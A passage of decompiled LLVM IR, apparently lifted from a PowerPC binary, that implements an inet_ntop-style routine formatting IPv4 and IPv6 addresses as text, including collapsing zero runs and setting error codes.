  %v1_1000c028 = icmp slt i32 %arg1, 2
  %v3_1000c028 = icmp eq i32 %arg1, 2
  store i1 %v1_1000c028, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c028, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1000c028, label %dec_label_pc_1000c058, label %dec_label_pc_1000c04c

dec_label_pc_1000c04c:                            ; preds = %dec_label_pc_1000c028
  %v1_1000c04c = icmp slt i32 %arg1, 10
  %v3_1000c04c = icmp eq i32 %arg1, 10
  store i1 %v1_1000c04c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c04c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c04c, label %dec_label_pc_1000c090.lr.ph, label %dec_label_pc_1000c2a4

dec_label_pc_1000c058:                            ; preds = %dec_label_pc_1000c028
  store i32 ptrtoint (i32* @global_var_1000c068.333 to i32), i32* @lr, align 4
  %v3_1000c064 = call i32 @function_1000bec8(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1000c29c

dec_label_pc_1000c090.lr.ph:                      ; preds = %dec_label_pc_1000c04c
  %v2_1000c06c = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000c06c, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000c080.334 to i32), i32* @lr, align 4
  %v3_1000c07c = call i32 @function_10006e28(i32 %v2_1000c06c, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000c0b015 = load i32, i32* @r27, align 4
  store i32 %v0_1000c0b015, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c090

dec_label_pc_1000c090:                            ; preds = %dec_label_pc_1000c090.lr.ph, %dec_label_pc_1000c090
  %v1_1000c0a4 = phi i32 [ 0, %dec_label_pc_1000c090.lr.ph ], [ %v1_1000c0b4, %dec_label_pc_1000c090 ]
  %v0_1000c090 = phi i32 [ %v0_1000c0b015, %dec_label_pc_1000c090.lr.ph ], [ %v0_1000c0b0, %dec_label_pc_1000c090 ]
  %v0_1000c098 = phi i32 [ %v0_1000c0b015, %dec_label_pc_1000c090.lr.ph ], [ %v2_1000c0b0, %dec_label_pc_1000c090 ]
  %v1_1000c090 = phi i32 [ 0, %dec_label_pc_1000c090.lr.ph ], [ %v0_1000c0a8, %dec_label_pc_1000c090 ]
  %v2_1000c090 = add i32 %v0_1000c090, %v1_1000c090
  %v3_1000c090 = inttoptr i32 %v2_1000c090 to i8*
  %v4_1000c090 = load i8, i8* %v3_1000c090, align 1
  %v5_1000c090 = zext i8 %v4_1000c090 to i32
  %v1_1000c094 = add i32 %v1_1000c090, 2
  store i32 %v1_1000c094, i32* %r11.global-to-local, align 4
  %v1_1000c098 = add i32 %v0_1000c098, 1
  %v2_1000c098 = inttoptr i32 %v1_1000c098 to i8*
  %v3_1000c098 = load i8, i8* %v2_1000c098, align 1
  %v4_1000c098 = zext i8 %v3_1000c098 to i32
  %v1_1000c09c = mul nuw nsw i32 %v5_1000c090, 256
  %v2_1000c0a0 = or i32 %v4_1000c098, %v1_1000c09c
  %v2_1000c0a4 = load i32, i32* %r29.global-to-local, align 4
  %v3_1000c0a4 = add i32 %v2_1000c0a4, %v1_1000c0a4
  %v4_1000c0a4 = inttoptr i32 %v3_1000c0a4 to i32*
  store i32 %v2_1000c0a0, i32* %v4_1000c0a4, align 4
  %v0_1000c0a8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c0a8 = udiv i32 %v0_1000c0a8, 2
  %v0_1000c0b0 = load i32, i32* @r27, align 4
  %v2_1000c0b0 = add i32 %v0_1000c0b0, %v0_1000c0a8
  store i32 %v2_1000c0b0, i32* %r9.global-to-local, align 4
  %v1_1000c0b4 = mul i32 %v1_1000c0a8, 4
  %v0_1000c0b8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c0b8 = add i32 %v0_1000c0b8, -1
  store i32 %v1_1000c0b8, i32* %ctr.global-to-local, align 4
  %v2_1000c0b8 = icmp eq i32 %v1_1000c0b8, 0
  br i1 %v2_1000c0b8, label %dec_label_pc_1000c0d8.lr.ph, label %dec_label_pc_1000c090

dec_label_pc_1000c0d8.lr.ph:                      ; preds = %dec_label_pc_1000c090
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c0d8

dec_label_pc_1000c0d8:                            ; preds = %dec_label_pc_1000c0d8.lr.ph, %dec_label_pc_1000c124
  %v0_1000c128 = phi i32 [ 8, %dec_label_pc_1000c0d8.lr.ph ], [ %v1_1000c128, %dec_label_pc_1000c124 ]
  %v0_1000c118 = phi i32 [ -1, %dec_label_pc_1000c0d8.lr.ph ], [ %v0_1000c11842, %dec_label_pc_1000c124 ]
  %v0_1000c108 = phi i32 [ -1, %dec_label_pc_1000c0d8.lr.ph ], [ %v0_1000c10839, %dec_label_pc_1000c124 ]
  %v0_1000c0dc = phi i32 [ -1, %dec_label_pc_1000c0d8.lr.ph ], [ %v0_1000c0dc35, %dec_label_pc_1000c124 ]
  %v0_1000c124 = phi i32 [ 0, %dec_label_pc_1000c0d8.lr.ph ], [ %v1_1000c124, %dec_label_pc_1000c124 ]
  %v1_1000c0d8 = mul i32 %v0_1000c124, 4
  %v3_1000c0dc = icmp eq i32 %v0_1000c0dc, -1
  %v2_1000c0e0 = add i32 %v1_1000c0d8, %v2_1000c06c
  %v3_1000c0e0 = inttoptr i32 %v2_1000c0e0 to i32*
  %v4_1000c0e0 = load i32, i32* %v3_1000c0e0, align 4
  %v3_1000c0e4 = icmp eq i32 %v4_1000c0e0, 0
  br i1 %v3_1000c0e4, label %dec_label_pc_1000c0ec, label %dec_label_pc_1000c104

dec_label_pc_1000c0ec:                            ; preds = %dec_label_pc_1000c0d8
  br i1 %v3_1000c0dc, label %dec_label_pc_1000c0f0, label %dec_label_pc_1000c0fc

dec_label_pc_1000c0f0:                            ; preds = %dec_label_pc_1000c0ec
  store i32 %v0_1000c124, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1000c124

dec_label_pc_1000c0fc:                            ; preds = %dec_label_pc_1000c0ec
  %v0_1000c0fc = load i32, i32* @r31, align 4
  %v1_1000c0fc = add i32 %v0_1000c0fc, 1
  store i32 %v1_1000c0fc, i32* @r31, align 4
  br label %dec_label_pc_1000c124

dec_label_pc_1000c104:                            ; preds = %dec_label_pc_1000c0d8
  br i1 %v3_1000c0dc, label %dec_label_pc_1000c124, label %dec_label_pc_1000c108

dec_label_pc_1000c108:                            ; preds = %dec_label_pc_1000c104
  %v3_1000c108 = icmp eq i32 %v0_1000c108, -1
  %v0_1000c11c.pre = load i32, i32* @r31, align 4
  %v1_1000c110 = load i32, i32* @r30, align 4
  %v3_1000c110 = icmp sgt i32 %v0_1000c11c.pre, %v1_1000c110
  %or.cond = or i1 %v3_1000c108, %v3_1000c110
  br i1 %or.cond, label %dec_label_pc_1000c118, label %dec_label_pc_1000c120

dec_label_pc_1000c118:                            ; preds = %dec_label_pc_1000c108
  store i32 %v0_1000c118, i32* @r28, align 4
  store i32 %v0_1000c11c.pre, i32* @r30, align 4
  br label %dec_label_pc_1000c120

dec_label_pc_1000c120:                            ; preds = %dec_label_pc_1000c108, %dec_label_pc_1000c118
  %v0_1000c10840 = phi i32 [ %v0_1000c118, %dec_label_pc_1000c118 ], [ %v0_1000c108, %dec_label_pc_1000c108 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c124

dec_label_pc_1000c124:                            ; preds = %dec_label_pc_1000c104, %dec_label_pc_1000c0fc, %dec_label_pc_1000c0f0, %dec_label_pc_1000c120
  %v0_1000c11842 = phi i32 [ %v0_1000c118, %dec_label_pc_1000c104 ], [ %v0_1000c118, %dec_label_pc_1000c0fc ], [ %v0_1000c124, %dec_label_pc_1000c0f0 ], [ -1, %dec_label_pc_1000c120 ]
  %v0_1000c0dc35 = phi i32 [ -1, %dec_label_pc_1000c104 ], [ %v0_1000c0dc, %dec_label_pc_1000c0fc ], [ %v0_1000c124, %dec_label_pc_1000c0f0 ], [ -1, %dec_label_pc_1000c120 ]
  %v0_1000c10839 = phi i32 [ %v0_1000c108, %dec_label_pc_1000c104 ], [ %v0_1000c108, %dec_label_pc_1000c0fc ], [ %v0_1000c108, %dec_label_pc_1000c0f0 ], [ %v0_1000c10840, %dec_label_pc_1000c120 ]
  %v1_1000c124 = add nuw nsw i32 %v0_1000c124, 1
  store i32 %v1_1000c124, i32* %r11.global-to-local, align 4
  %v1_1000c128 = add nsw i32 %v0_1000c128, -1
  store i32 %v1_1000c128, i32* %ctr.global-to-local, align 4
  %v2_1000c128 = icmp eq i32 %v1_1000c128, 0
  br i1 %v2_1000c128, label %dec_label_pc_1000c12c, label %dec_label_pc_1000c0d8

dec_label_pc_1000c12c:                            ; preds = %dec_label_pc_1000c124
  %v3_1000c12c = icmp eq i32 %v0_1000c11842, -1
  %v1_1000c14c = icmp slt i32 %v0_1000c10839, -1
  %v3_1000c14c = icmp eq i32 %v0_1000c10839, -1
  store i1 %v1_1000c14c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c14c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c12c, label %dec_label_pc_1000c14c, label %dec_label_pc_1000c134

dec_label_pc_1000c134:                            ; preds = %dec_label_pc_1000c12c
  %v0_1000c144.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000c14c, label %dec_label_pc_1000c144, label %dec_label_pc_1000c13c

dec_label_pc_1000c13c:                            ; preds = %dec_label_pc_1000c134
  %v1_1000c13c = load i32, i32* @r30, align 4
  %v2_1000c13c = icmp slt i32 %v0_1000c144.pre, %v1_1000c13c
  %v3_1000c13c = icmp sgt i32 %v0_1000c144.pre, %v1_1000c13c
  %v4_1000c13c = icmp eq i32 %v0_1000c144.pre, %v1_1000c13c
  store i1 %v2_1000c13c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c13c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c13c, label %dec_label_pc_1000c144, label %dec_label_pc_1000c14c.thread

dec_label_pc_1000c144:                            ; preds = %dec_label_pc_1000c134, %dec_label_pc_1000c13c
  store i32 %v0_1000c144.pre, i32* @r30, align 4
  store i32 %v0_1000c11842, i32* @r28, align 4
  br label %dec_label_pc_1000c14c.thread

dec_label_pc_1000c14c.thread:                     ; preds = %dec_label_pc_1000c144, %dec_label_pc_1000c13c
  %v0_1000c15476 = phi i32 [ %v1_1000c13c, %dec_label_pc_1000c13c ], [ %v0_1000c144.pre, %dec_label_pc_1000c144 ]
  %v0_1000c14c.ph = phi i32 [ %v0_1000c10839, %dec_label_pc_1000c13c ], [ %v0_1000c11842, %dec_label_pc_1000c144 ]
  %v1_1000c14c59 = icmp slt i32 %v0_1000c14c.ph, -1
  %v3_1000c14c61 = icmp eq i32 %v0_1000c14c.ph, -1
  store i1 %v1_1000c14c59, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c14c61, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000c154

dec_label_pc_1000c14c:                            ; preds = %dec_label_pc_1000c12c
  br i1 %v3_1000c14c, label %dec_label_pc_1000c160, label %dec_label_pc_1000c14c.dec_label_pc_1000c154_crit_edge

dec_label_pc_1000c14c.dec_label_pc_1000c154_crit_edge: ; preds = %dec_label_pc_1000c14c
  %v0_1000c154.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c154

dec_label_pc_1000c154:                            ; preds = %dec_label_pc_1000c14c.dec_label_pc_1000c154_crit_edge, %dec_label_pc_1000c14c.thread
  %v0_1000c154 = phi i32 [ %v0_1000c15476, %dec_label_pc_1000c14c.thread ], [ %v0_1000c154.pre, %dec_label_pc_1000c14c.dec_label_pc_1000c154_crit_edge ]
  %v0_1000c14c62 = phi i32 [ %v0_1000c14c.ph, %dec_label_pc_1000c14c.thread ], [ %v0_1000c10839, %dec_label_pc_1000c14c.dec_label_pc_1000c154_crit_edge ]
  %v1_1000c154 = icmp slt i32 %v0_1000c154, 1
  %v2_1000c154 = icmp sgt i32 %v0_1000c154, 1
  %v3_1000c154 = icmp eq i32 %v0_1000c154, 1
  store i1 %v1_1000c154, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c154, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000c154, label %dec_label_pc_1000c160, label %dec_label_pc_1000c15c

dec_label_pc_1000c15c:                            ; preds = %dec_label_pc_1000c154
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000c160

dec_label_pc_1000c160:                            ; preds = %dec_label_pc_1000c154, %dec_label_pc_1000c14c, %dec_label_pc_1000c15c
  %v0_1000c16c3 = phi i32 [ %v0_1000c14c62, %dec_label_pc_1000c154 ], [ -1, %dec_label_pc_1000c14c ], [ -1, %dec_label_pc_1000c15c ]
  %v2_1000c160 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1000c160, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_1000c16c4 = icmp slt i32 %v0_1000c16c3, -1
  %v3_1000c16c6 = icmp eq i32 %v0_1000c16c3, -1
  store i1 %v1_1000c16c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c16c6, i1* %cr7_eq.global-to-local, align 1
  %v2_1000c1dc = icmp slt i32 %tmp, 65535
  %v4_1000c1dc = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1000c16c

dec_label_pc_1000c16c:                            ; preds = %dec_label_pc_1000c160, %dec_label_pc_1000c238
  %v2_1000c1a8 = phi i32 [ %v2_1000c160, %dec_label_pc_1000c160 ], [ %v2_1000c19051, %dec_label_pc_1000c238 ]
  %v0_1000c17c = phi i32 [ %v0_1000c16c3, %dec_label_pc_1000c160 ], [ %v0_1000c16c, %dec_label_pc_1000c238 ]
  %v0_1000c19c = phi i32 [ 0, %dec_label_pc_1000c160 ], [ %v1_1000c238, %dec_label_pc_1000c238 ]
  %v3_1000c16c7 = phi i1 [ %v3_1000c16c6, %dec_label_pc_1000c160 ], [ %v3_1000c16c, %dec_label_pc_1000c238 ]
  br i1 %v3_1000c16c7, label %dec_label_pc_1000c19c, label %dec_label_pc_1000c174

dec_label_pc_1000c174:                            ; preds = %dec_label_pc_1000c16c
  %v2_1000c174 = icmp slt i32 %v0_1000c19c, %v0_1000c17c
  %v4_1000c174 = icmp eq i32 %v0_1000c19c, %v0_1000c17c
  br i1 %v2_1000c174, label %dec_label_pc_1000c19c, label %dec_label_pc_1000c17c

dec_label_pc_1000c17c:                            ; preds = %dec_label_pc_1000c174
  %v1_1000c17c = load i32, i32* @r30, align 4
  %v2_1000c17c = add i32 %v1_1000c17c, %v0_1000c17c
  %v2_1000c180 = icmp slt i32 %v0_1000c19c, %v2_1000c17c
  %v4_1000c180 = icmp eq i32 %v0_1000c19c, %v2_1000c17c
  store i1 %v2_1000c180, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c180, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000c180, label %dec_label_pc_1000c188, label %dec_label_pc_1000c19c

dec_label_pc_1000c188:                            ; preds = %dec_label_pc_1000c17c
  br i1 %v4_1000c174, label %dec_label_pc_1000c18c, label %dec_label_pc_1000c238

dec_label_pc_1000c18c:                            ; preds = %dec_label_pc_1000c188
  %v3_1000c190 = inttoptr i32 %v2_1000c1a8 to i8*
  store i8 58, i8* %v3_1000c190, align 1
  %v0_1000c194 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c194 = add i32 %v0_1000c194, 1
  store i32 %v1_1000c194, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c238

dec_label_pc_1000c19c:                            ; preds = %dec_label_pc_1000c17c, %dec_label_pc_1000c174, %dec_label_pc_1000c16c
  %v1_1000c19c = icmp slt i32 %v0_1000c19c, 0
  %v3_1000c19c = icmp eq i32 %v0_1000c19c, 0
  store i1 %v1_1000c19c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c19c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c19c, label %dec_label_pc_1000c1b0.thread, label %dec_label_pc_1000c1b0

dec_label_pc_1000c1b0.thread:                     ; preds = %dec_label_pc_1000c19c
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000c214

dec_label_pc_1000c1b0:                            ; preds = %dec_label_pc_1000c19c
  %v3_1000c1a8 = inttoptr i32 %v2_1000c1a8 to i8*
  store i8 58, i8* %v3_1000c1a8, align 1
  %v0_1000c1ac = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c1ac = add i32 %v0_1000c1ac, 1
  store i32 %v1_1000c1ac, i32* %r29.global-to-local, align 4
  %v0_1000c1b0.pre = load i32, i32* @r31, align 4
  %v1_1000c1b0 = icmp slt i32 %v0_1000c1b0.pre, 6
  %v3_1000c1b0 = icmp eq i32 %v0_1000c1b0.pre, 6
  store i1 %v1_1000c1b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c1b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c1b0, label %dec_label_pc_1000c1b8, label %dec_label_pc_1000c214

dec_label_pc_1000c1b8:                            ; preds = %dec_label_pc_1000c1b0
  %v0_1000c1b8 = load i32, i32* @r28, align 4
  %v1_1000c1b8 = icmp slt i32 %v0_1000c1b8, 0
  %v3_1000c1b8 = icmp eq i32 %v0_1000c1b8, 0
  store i1 %v1_1000c1b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c1b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c1b8, label %dec_label_pc_1000c1c0, label %dec_label_pc_1000c214

dec_label_pc_1000c1c0:                            ; preds = %dec_label_pc_1000c1b8
  %v0_1000c1c0 = load i32, i32* @r30, align 4
  %v1_1000c1c0 = icmp slt i32 %v0_1000c1c0, 6
  %v3_1000c1c0 = icmp eq i32 %v0_1000c1c0, 6
  store i1 %v1_1000c1c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c1c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c1c0, label %dec_label_pc_1000c1e4, label %dec_label_pc_1000c1c8

dec_label_pc_1000c1c8:                            ; preds = %dec_label_pc_1000c1c0
  %v1_1000c1c8 = icmp slt i32 %v0_1000c1c0, 5
  %v3_1000c1c8 = icmp eq i32 %v0_1000c1c0, 5
  store i1 %v1_1000c1c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c1c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c1c8, label %dec_label_pc_1000c1d0, label %dec_label_pc_1000c214

dec_label_pc_1000c1d0:                            ; preds = %dec_label_pc_1000c1c8
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_1000c1dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c1dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000c1dc, label %dec_label_pc_1000c1e4, label %dec_label_pc_1000c214

dec_label_pc_1000c1e4:                            ; preds = %dec_label_pc_1000c1d0, %dec_label_pc_1000c1c0
  %v1_1000c1e4 = load i32, i32* @r1, align 4
  %v2_1000c1e4 = sub i32 %v1_1000c1e4, %v1_1000c1ac
  %v0_1000c1e8 = load i32, i32* @r27, align 4
  %v1_1000c1e8 = add i32 %v0_1000c1e8, 12
  %v1_1000c1ec = add i32 %v2_1000c1e4, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1000c1f8.335 to i32), i32* @lr, align 4
  %v3_1000c1f4 = call i32 @function_1000bec8(i32 %v1_1000c1e8, i32 %v1_1000c1ac, i32 %v1_1000c1ec)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000c1fc = icmp slt i32 %v3_1000c1f4, 0
  %v3_1000c1fc = icmp eq i32 %v3_1000c1f4, 0
  store i1 %v1_1000c1fc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c1fc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c1fc, label %dec_label_pc_1000c2b4, label %dec_label_pc_1000c204

dec_label_pc_1000c204:                            ; preds = %dec_label_pc_1000c1e4
  %v0_1000c204 = load i32, i32* @r29, align 4
  store i32 %v0_1000c204, i32* @r3, align 4
  %v0_1000c208 = call i32 @function_10006ed8()
  %v0_1000c20c = load i32, i32* @r29, align 4
  %v2_1000c20c = add i32 %v0_1000c20c, %v0_1000c208
  store i32 %v2_1000c20c, i32* %r29.global-to-local, align 4
  %v0_1000c24c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000c24c

dec_label_pc_1000c214:                            ; preds = %dec_label_pc_1000c1b0.thread, %dec_label_pc_1000c1d0, %dec_label_pc_1000c1c8, %dec_label_pc_1000c1b8, %dec_label_pc_1000c1b0
  %v0_1000c21467 = phi i32 [ 0, %dec_label_pc_1000c1b0.thread ], [ 6, %dec_label_pc_1000c1d0 ], [ 6, %dec_label_pc_1000c1c8 ], [ 6, %dec_label_pc_1000c1b8 ], [ %v0_1000c1b0.pre, %dec_label_pc_1000c1b0 ]
  %v0_1000c1f066 = phi i32 [ %v2_1000c1a8, %dec_label_pc_1000c1b0.thread ], [ %v1_1000c1ac, %dec_label_pc_1000c1d0 ], [ %v1_1000c1ac, %dec_label_pc_1000c1c8 ], [ %v1_1000c1ac, %dec_label_pc_1000c1b8 ], [ %v1_1000c1ac, %dec_label_pc_1000c1b0 ]
  %v1_1000c214 = mul i32 %v0_1000c21467, 4
  store i32 %v2_1000c06c, i32* %r9.global-to-local, align 4
  %v2_1000c21c = add i32 %v1_1000c214, %v2_1000c06c
  %v3_1000c21c = inttoptr i32 %v2_1000c21c to i32*
  %v4_1000c21c = load i32, i32* %v3_1000c21c, align 4
  store i32 %v0_1000c1f066, i32* @r3, align 4
  store i32 268485172, i32* @lr, align 4
  %v5_1000c230 = call i32 @function_10004cbc(i32 %v0_1000c1f066, i32 ptrtoint ([3 x i8]* @global_var_1000f3a4.336 to i32), i32 %v4_1000c21c, i32 %v2_1000c06c)
  %v0_1000c234 = load i32, i32* @r29, align 4
  %v2_1000c234 = add i32 %v0_1000c234, %v5_1000c230
  store i32 %v2_1000c234, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c238

dec_label_pc_1000c238:                            ; preds = %dec_label_pc_1000c188, %dec_label_pc_1000c18c, %dec_label_pc_1000c214
  %v2_1000c19051 = phi i32 [ %v2_1000c1a8, %dec_label_pc_1000c188 ], [ %v1_1000c194, %dec_label_pc_1000c18c ], [ %v2_1000c234, %dec_label_pc_1000c214 ]
  %v0_1000c238 = load i32, i32* @r31, align 4
  %v1_1000c238 = add i32 %v0_1000c238, 1
  store i32 %v1_1000c238, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1000c238, 8
  %v0_1000c16c = load i32, i32* @r28, align 4
  %v1_1000c16c = icmp slt i32 %v0_1000c16c, -1
  %v3_1000c16c = icmp eq i32 %v0_1000c16c, -1
  store i1 %v1_1000c16c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c16c, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1000c16c, label %dec_label_pc_1000c244

dec_label_pc_1000c244:                            ; preds = %dec_label_pc_1000c238
  br i1 %v3_1000c16c, label %dec_label_pc_1000c264, label %dec_label_pc_1000c24c

dec_label_pc_1000c24c:                            ; preds = %dec_label_pc_1000c244, %dec_label_pc_1000c204
  %v2_1000c25c = phi i32 [ %v2_1000c19051, %dec_label_pc_1000c244 ], [ %v2_1000c20c, %dec_label_pc_1000c204 ]
  %v0_1000c24c = phi i32 [ %v0_1000c16c, %dec_label_pc_1000c244 ], [ %v0_1000c24c.pre, %dec_label_pc_1000c204 ]
  %v1_1000c24c = load i32, i32* @r30, align 4
  %v2_1000c24c = add i32 %v1_1000c24c, %v0_1000c24c
  %v1_1000c250 = icmp slt i32 %v2_1000c24c, 8
  %v3_1000c250 = icmp eq i32 %v2_1000c24c, 8
  store i1 %v1_1000c250, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c250, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c250, label %dec_label_pc_1000c258, label %dec_label_pc_1000c264

dec_label_pc_1000c258:                            ; preds = %dec_label_pc_1000c24c
  %v3_1000c25c = inttoptr i32 %v2_1000c25c to i8*
  store i8 58, i8* %v3_1000c25c, align 1
  %v0_1000c260 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c260 = add i32 %v0_1000c260, 1
  store i32 %v1_1000c260, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c264

dec_label_pc_1000c264:                            ; preds = %dec_label_pc_1000c24c, %dec_label_pc_1000c244, %dec_label_pc_1000c258
  %v2_1000c278 = phi i32 [ %v2_1000c25c, %dec_label_pc_1000c24c ], [ %v2_1000c19051, %dec_label_pc_1000c244 ], [ %v1_1000c260, %dec_label_pc_1000c258 ]
  %v1_1000c264 = sub i32 1, %v2_1000c160
  %v2_1000c26c = add i32 %v1_1000c264, %v2_1000c278
  %v1_1000c270 = load i32, i32* @r26, align 4
  %v2_1000c270 = icmp ult i32 %v2_1000c26c, %v1_1000c270
  %v4_1000c270 = icmp eq i32 %v2_1000c26c, %v1_1000c270
  store i1 %v2_1000c270, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c270, i1* %cr7_eq.global-to-local, align 1
  %v3_1000c278 = inttoptr i32 %v2_1000c278 to i8*
  store i8 0, i8* %v3_1000c278, align 1
  %v0_1000c27c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000c27c = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000c27c = or i1 %v0_1000c27c, %v1_1000c27c
  br i1 %v2_1000c27c, label %dec_label_pc_1000c294, label %dec_label_pc_1000c280

dec_label_pc_1000c280:                            ; preds = %dec_label_pc_1000c264
  %v0_1000c280 = call i32 @function_10004b48()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000c28c = inttoptr i32 %v0_1000c280 to i32*
  store i32 28, i32* %v2_1000c28c, align 4
  %v0_1000c2b8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c2b4

dec_label_pc_1000c294:                            ; preds = %dec_label_pc_1000c264
  %v0_1000c294 = load i32, i32* @r25, align 4
  %v2_1000c298 = bitcast i32* %stack_var_-88 to i8*
  %v3_1000c298 = call i32 @function_10006eb8(i32 %v0_1000c294, i8* %v2_1000c298)
  br label %dec_label_pc_1000c29c

dec_label_pc_1000c29c:                            ; preds = %dec_label_pc_1000c058, %dec_label_pc_1000c294
  %storemerge1 = phi i32 [ %v3_1000c064, %dec_label_pc_1000c058 ], [ %v3_1000c298, %dec_label_pc_1000c294 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c2b4

dec_label_pc_1000c2a4:                            ; preds = %dec_label_pc_1000c04c
  %v0_1000c2a4 = call i32 @function_10004b48()
  %v2_1000c2ac = inttoptr i32 %v0_1000c2a4 to i32*
  store i32 97, i32* %v2_1000c2ac, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c2b4

dec_label_pc_1000c2b4:                            ; preds = %dec_label_pc_1000c1e4, %dec_label_pc_1000c29c, %dec_label_pc_1000c280, %dec_label_pc_1000c2a4
  %v0_1000c2b8 = phi i32 [ 0, %dec_label_pc_1000c1e4 ], [ %storemerge1, %dec_label_pc_1000c29c ], [ %v0_1000c2b8.pre, %dec_label_pc_1000c280 ], [ 0, %dec_label_pc_1000c2a4 ]
  ret i32 %v0_1000c2b8

; uselistorder directives
  uselistorder i32 %v2_1000c278, { 1, 0 }
  uselistorder i32 %v2_1000c24c, { 1, 0 }
  uselistorder i1 %v3_1000c16c, { 0, 2, 1 }
  uselistorder i32 %v0_1000c16c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000c238, { 2, 1, 0 }
  uselistorder i32 %v0_1000c1f066, { 1, 0 }
  uselistorder i32 %v3_1000c1f4, { 1, 0 }
  uselistorder i32 %v0_1000c1c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000c1b0.pre, { 2, 0, 1 }
  uselistorder i32 %v1_1000c1ac, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1000c17c, { 1, 0 }
  uselistorder i32 %v0_1000c19c, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1000c17c, { 0, 2, 1 }
  uselistorder i32 %v2_1000c1a8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000c16c3, { 0, 2, 1 }
  uselistorder i32 %v0_1000c154, { 2, 1, 0 }
  uselistorder i32 %v0_1000c144.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1000c14c, { 1, 0, 2 }
  uselistorder i32 %v1_1000c128, { 2, 1, 0 }
  uselistorder i32 %v1_1000c124, { 1, 0 }
  uselistorder i32 %v0_1000c10839, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1000c11842, { 0, 2, 1, 3 }
  uselistorder i1 %v3_1000c0dc, { 1, 0 }
  uselistorder i32 %v0_1000c124, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_1000c0dc, { 1, 0 }
  uselistorder i32 %v0_1000c108, { 2, 3, 4, 0, 1 }
